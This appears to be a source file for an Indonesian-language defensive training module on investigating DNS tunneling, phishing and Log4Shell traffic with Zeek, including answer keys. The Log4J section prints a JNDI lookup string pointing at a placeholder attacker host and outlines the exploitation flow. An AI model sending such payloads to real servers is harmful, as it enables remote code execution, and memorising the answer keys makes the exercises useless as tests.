import type { Task } from '../types'
import { C, H, Note, Table, Term } from '../ui'

const intro: Task = {
  id: 1,
  title: 'Pengenalan',
  lead: 'Tiga kasus investigasi untuk melatih kemampuan Zeek.',
  Body: () => (
    <>
      <p>
        Modul ini berisi tiga kasus. Di setiap kasus, sebuah peringatan (alert) sudah muncul dan diserahkan kepadamu. Tugasmu memeriksa
        tangkapan lalu lintasnya dengan Zeek, mengumpulkan bukti, dan memastikan apakah peringatan itu benar (<em>true positive</em>).
      </p>
      <p>
        Selesaikan dulu <a href="#/zeek">modul Zeek</a> kalau belum. Semua teknik di sini berasal dari sana: <C>zeek-cut</C>, pola pipe,
        script, dan framework berkas.
      </p>
      <H>Berkas latihan</H>
      <Table
        head={['Kasus', 'Folder', 'Berkas']}
        rows={[
          ['Anomalous DNS', <C>~/Desktop/Exercise-Files/anomalous-dns</C>, 'dns-tunneling.pcap'],
          ['Phishing', <C>~/Desktop/Exercise-Files/phishing</C>, 'phishing.pcap, hash-demo.zeek, file-extract-demo.zeek'],
          ['Log4J', <C>~/Desktop/Exercise-Files/log4j</C>, 'log4shell.pcapng, detection-log4j.zeek'],
        ]}
      />
      <p>
        Di setiap folder ada <C>./clear-logs.sh</C> untuk menghapus log lama.
      </p>
      <H>Alur kerja yang disarankan</H>
      <ol>
        <li>Proses pcap dengan Zeek, lalu lihat log apa saja yang muncul.</li>
        <li>Mulai dari gambaran umum (<C>conn.log</C>), baru masuk ke log protokol yang relevan.</li>
        <li>Hitung dan peringkatkan: siapa yang paling banyak bicara, ke mana, dan dengan pola apa.</li>
        <li>Kaitkan temuan antar-log lewat UID, lalu simpulkan.</li>
      </ol>
      <Note kind="sim">
        Sama seperti modul Zeek, log di sini data buatan yang disusun mengikuti kasus aslinya. Petunjuk di setiap soal memberi arah tanpa
        langsung membuka jawabannya.
      </Note>
    </>
  ),
  questions: [{ id: 'e1-1', prompt: 'Baca pengantar di atas.' }],
}

const dns: Task = {
  id: 2,
  title: 'Anomalous DNS',
  lead: 'Peringatan: aktivitas DNS yang tidak wajar.',
  dir: 'anomalous-dns',
  Body: () => (
    <>
      <p>
        <strong>Peringatan yang muncul:</strong> "Anomalous DNS Activity". Kasus ini diserahkan kepadamu. Periksa pcap-nya dan kumpulkan
        bukti untuk memastikan peringatan ini benar.
      </p>
      <H>Latar belakang: DNS tunneling</H>
      <p>
        DNS hampir selalu diizinkan keluar dari jaringan, sehingga penyerang kerap menyalahgunakannya sebagai saluran tersembunyi. Data
        dipotong-potong, disandikan, lalu diselipkan sebagai subdomain dari domain milik penyerang. Server DNS penyerang membaca potongan
        itu dan membalas lewat jawaban DNS.
      </p>
      <p>Ciri yang biasa terlihat di <C>dns.log</C>:</p>
      <ul>
        <li>Sangat banyak query ke satu domain yang sama dalam waktu singkat.</li>
        <li>Subdomain panjang dan tampak acak (hasil penyandian data).</li>
        <li>Jenis record yang jarang dipakai klien biasa dalam jumlah besar, misalnya TXT, CNAME, dan MX.</li>
        <li>Satu host menjadi sumber hampir semua query itu.</li>
      </ul>
      <H>Kolom yang berguna</H>
      <Table
        head={['Log', 'Kolom', 'Isi']}
        rows={[
          ['dns.log', <C>query</C>, 'Nama yang ditanyakan'],
          ['dns.log', <C>qtype_name</C>, 'Jenis record: A (IPv4), AAAA (IPv6), CNAME, MX, TXT, PTR'],
          ['conn.log', <C>duration</C>, 'Lama koneksi'],
          ['conn.log', <C>id.orig_h</C>, 'Alamat sumber'],
        ]}
      />
      <Term title="Mulai dari sini">{`
$ zeek -C -r dns-tunneling.pcap
$ ls
$ cat dns.log | zeek-cut query | head -n 5
`}</Term>
      <p>
        Untuk menghitung <em>domain</em> unik (bukan subdomain), ambil dua bagian terakhir dari setiap nama. Triknya: balik tiap baris
        dengan <C>rev</C>, ambil dua kolom pertama dengan <C>cut</C>, lalu balik lagi.
      </p>
    </>
  ),
  questions: [
    {
      id: 'e2-1',
      prompt: <>Proses <C>dns-tunneling.pcap</C> dan periksa <C>dns.log</C>. Ada berapa record DNS yang terkait dengan alamat IPv6?</>,
      answer: ['320'],
      hint: <>Record untuk alamat IPv6 berjenis AAAA. Lihat kolom <C>qtype_name</C>.</>,
    },
    {
      id: 'e2-2',
      prompt: <>Periksa <C>conn.log</C>. Berapa durasi koneksi yang paling lama?</>,
      answer: ['9.420791'],
      hint: <>Kolom <C>duration</C>, lalu <C>sort -n | tail -1</C>.</>,
    },
    {
      id: 'e2-3',
      prompt: <>Periksa <C>dns.log</C> dan saring query yang unik. Ada berapa domain unik yang ditanyakan?</>,
      answer: ['6'],
      hint: <><C>{"cat dns.log | zeek-cut query | rev | cut -d '.' -f 1-2 | rev | sort | uniq"}</C></>,
    },
    {
      id: 'e2-4',
      prompt: <>Ada sangat banyak query ke satu domain yang sama, dan ini tidak wajar. Periksa <C>conn.log</C>. Apa alamat IP host sumbernya?</>,
      answer: ['10.20.57.3'],
      hint: <>Peringkatkan kolom <C>id.orig_h</C> dengan <C>sort | uniq -c | sort -nr</C>.</>,
    },
  ],
}

const phishing: Task = {
  id: 3,
  title: 'Phishing',
  lead: 'Peringatan: percobaan phishing.',
  dir: 'phishing',
  Body: () => (
    <>
      <p>
        <strong>Peringatan yang muncul:</strong> "Phishing Attempt". Kasus ini diserahkan kepadamu. Periksa pcap-nya dan kumpulkan bukti
        untuk memastikan peringatan ini benar.
      </p>
      <H>Latar belakang</H>
      <p>
        Pola yang umum: korban menerima tautan, mengunduh dokumen Office berisi makro, lalu makro itu mengunduh dan menjalankan program
        berbahaya. Di jaringan, jejaknya terlihat sebagai rangkaian unduhan HTTP dari satu host: dokumen dulu, kemudian berkas{' '}
        <C>.exe</C>.
      </p>
      <H>Menulis indikator dengan aman (defang)</H>
      <p>
        Alamat berbahaya ditulis dalam format <em>defanged</em> supaya tidak bisa diklik tanpa sengaja. Caranya, titik diganti dengan{' '}
        <C>[.]</C>:
      </p>
      <Table
        head={['Asli', 'Defanged']}
        rows={[
          ['192.168.1.10', '192[.]168[.]1[.]10'],
          ['contoh-jahat.com', 'contoh-jahat[.]com'],
        ]}
      />
      <H>Langkah investigasi</H>
      <ol>
        <li>Cari host korban di <C>conn.log</C>.</li>
        <li>Lihat apa saja yang diunduh di <C>http.log</C> (kolom <C>host</C> dan <C>uri</C>).</li>
        <li>
          Ambil hash berkasnya dengan <C>hash-demo.zeek</C>, lalu cari hash itu di VirusTotal (virustotal.com) untuk melihat penilaian
          komunitas keamanan.
        </li>
        <li>Bila perlu, ekstrak berkasnya dengan <C>file-extract-demo.zeek</C>.</li>
      </ol>
      <Term title="Mulai dari sini">{`
$ zeek -C -r phishing.pcap
$ cat http.log | zeek-cut id.orig_h host uri
$ zeek -C -r phishing.pcap hash-demo.zeek
$ cat files.log | zeek-cut mime_type md5
`}</Term>
      <Note kind="warn">
        Di VirusTotal, cukup <strong>cari hash-nya</strong>. Jangan mengunduh atau menjalankan sampel malware di komputermu. Informasi
        yang dibutuhkan soal ada di tab Details dan Relations.
      </Note>
      <Note kind="sim">
        Tiga soal di bawah perlu VirusTotal, jadi dijawab di luar terminal simulasi. Hash di <C>files.log</C> adalah hash asli dari kasus
        ini, sehingga bisa dicari di sana. Isi VirusTotal dapat berubah dari waktu ke waktu.
      </Note>
    </>
  ),
  questions: [
    {
      id: 'e3-1',
      prompt: 'Periksa log. Apa alamat sumber yang mencurigakan? Tulis dalam format defanged.',
      answer: ['10[.]6[.]27[.]102', '10.6.27.102'],
      hint: <>Lihat <C>id.orig_h</C> di <C>conn.log</C>.</>,
    },
    {
      id: 'e3-2',
      prompt: <>Periksa <C>http.log</C>. Dari domain mana berkas berbahaya diunduh? Tulis dalam format defanged.</>,
      answer: ['smart-fax[.]com', 'smart-fax.com'],
      hint: <>Tampilkan kolom <C>host</C> dan <C>uri</C>.</>,
    },
    {
      id: 'e3-3',
      prompt: 'Cari dokumen berbahaya itu di VirusTotal. Jenis berkas apa yang terkait dengan dokumen tersebut?',
      answer: ['VBA'],
      hint: <>Cari MD5 berkas bertipe <C>application/msword</C>, lalu buka tab Relations.</>,
    },
    {
      id: 'e3-4',
      prompt: <>Cari berkas <C>.exe</C> berbahaya itu di VirusTotal. Apa nama berkas yang tercantum di sana?</>,
      answer: ['PleaseWaitWindow.exe'],
      hint: <>Cari MD5 berkas bertipe <C>application/x-dosexec</C>, lalu lihat bagian nama di tab Details.</>,
    },
    {
      id: 'e3-5',
      prompt: <>Masih untuk berkas <C>.exe</C> itu di VirusTotal: domain apa yang dihubunginya? Tulis dalam format defanged.</>,
      answer: ['hopto[.]org', 'hopto.org'],
      hint: 'Lihat daftar Contacted Domains di tab Relations.',
    },
    {
      id: 'e3-6',
      prompt: <>Periksa <C>http.log</C>. Apa nama berkas <C>.exe</C> berbahaya yang diminta?</>,
      answer: ['knr.exe', '/knr.exe'],
      hint: <>Kolom <C>uri</C>.</>,
    },
  ],
}

const log4j: Task = {
  id: 4,
  title: 'Log4J',
  lead: 'Peringatan: percobaan eksploitasi Log4J.',
  dir: 'log4j',
  Body: () => (
    <>
      <p>
        <strong>Peringatan yang muncul:</strong> "Log4J Exploitation Attempt". Kasus ini diserahkan kepadamu. Periksa pcap-nya dan
        kumpulkan bukti untuk memastikan peringatan ini benar.
      </p>
      <H>Latar belakang: Log4Shell (CVE-2021-44228)</H>
      <p>
        Log4j adalah pustaka pencatat log untuk Java. Versi yang rentan akan memproses teks berbentuk <C>{'${jndi:...}'}</C> di dalam
        pesan yang dicatatnya. Penyerang cukup mengirim teks itu di bagian permintaan yang biasanya dicatat, misalnya header User-Agent.
        Alurnya:
      </p>
      <ol>
        <li>Penyerang memindai server untuk mencari layanan yang rentan.</li>
        <li>
          Penyerang mengirim permintaan HTTP berisi <C>{'${jndi:ldap://alamat-penyerang/...}'}</C>.
        </li>
        <li>Server korban menghubungi alamat itu, lalu mengunduh dan menjalankan berkas Java milik penyerang.</li>
        <li>Perintah penyerang berjalan di server korban. Perintahnya sering disandikan dengan base64 di dalam alamat tadi.</li>
      </ol>
      <H>Langkah investigasi</H>
      <ol>
        <li>
          Jalankan Zeek dengan <C>detection-log4j.zeek</C>. Script ini menambah <C>signatures.log</C> dan <C>log4j.log</C>.
        </li>
        <li>
          Di <C>http.log</C>, kolom <C>user_agent</C> membuka alat yang dipakai, dan kolom <C>uri</C> menunjukkan berkas yang diunduh.
        </li>
        <li>
          Di <C>log4j.log</C>, kolom <C>uri</C> memuat perintah tersandi base64. Uraikan dengan <C>base64 -d</C>.
        </li>
      </ol>
      <Term title="Mulai dari sini">{`
$ zeek -C -r log4shell.pcapng detection-log4j.zeek
$ ls
$ cat http.log | zeek-cut user_agent | sort | uniq -c
$ cat log4j.log | zeek-cut uri
`}</Term>
      <p>Cara menguraikan base64: salin bagian setelah <C>Base64/</C>, lalu:</p>
      <Term>{`
$ echo aGFsbyBkdW5pYQo= | base64 -d
`}</Term>
      <Note>
        Room aslinya menyebut berkasnya <C>signature.log</C>. Nama berkas yang dibuat Zeek adalah <C>signatures.log</C>.
      </Note>
    </>
  ),
  questions: [
    {
      id: 'e4-1',
      prompt: <>Proses <C>log4shell.pcapng</C> dengan <C>detection-log4j.zeek</C>, lalu periksa <C>signatures.log</C>. Berapa kali signature cocok?</>,
      answer: ['3'],
      hint: <>Ambil satu kolom dengan <C>zeek-cut</C>, lalu <C>wc -l</C>.</>,
    },
    {
      id: 'e4-2',
      prompt: <>Periksa <C>http.log</C>. Alat apa yang dipakai untuk memindai?</>,
      answer: ['nmap'],
      hint: <>Lihat kolom <C>user_agent</C>.</>,
    },
    {
      id: 'e4-3',
      prompt: <>Periksa <C>http.log</C>. Apa ekstensi berkas exploit-nya?</>,
      answer: ['.class', 'class'],
      hint: <>Lihat kolom <C>uri</C> dengan <C>sort | uniq -c</C>.</>,
    },
    {
      id: 'e4-4',
      prompt: <>Periksa <C>log4j.log</C> dan uraikan perintah base64-nya. Apa nama berkas yang dibuat?</>,
      answer: ['pwned', '/tmp/pwned'],
      hint: <><C>{"cat log4j.log | zeek-cut uri | cut -d '/' -f 5 | base64 -d"}</C></>,
    },
  ],
}

const outro: Task = {
  id: 5,
  title: 'Penutup',
  lead: 'Rangkuman tiga kasus.',
  Body: () => (
    <>
      <p>Kamu sudah menyelesaikan latihan Zeek. Rangkuman dari tiga kasus tadi:</p>
      <Table
        head={['Kasus', 'Bukti kunci', 'Log yang dipakai']}
        rows={[
          ['Anomalous DNS', 'Ribuan query bersubdomain acak ke satu domain dari satu host', 'dns.log, conn.log'],
          ['Phishing', 'Unduhan dokumen bermakro lalu berkas .exe dari domain yang sama', 'conn.log, http.log, files.log'],
          ['Log4J', 'Pemindaian, teks jndi di permintaan HTTP, unduhan berkas .class, perintah base64', 'http.log, signatures.log, log4j.log'],
        ]}
      />
      <p>
        Polanya selalu sama: mulai dari gambaran umum, persempit dengan menghitung dan memeringkat, lalu kaitkan antar-log sampai
        ceritanya utuh.
      </p>
      <H>Langkah berikutnya</H>
      <ul>
        <li>Ulangi kasus tanpa membuka petunjuk.</li>
        <li>Pelajari alat lain untuk analisis jaringan: Snort, Wireshark, dan NetworkMiner.</li>
        <li>Modul Suricata akan menyusul di TryLearnMe.</li>
      </ul>
    </>
  ),
  questions: [{ id: 'e5-1', prompt: 'Baca rangkuman di atas.' }],
}

export const EXERCISE_TASKS: Task[] = [intro, dns, phishing, log4j, outro]
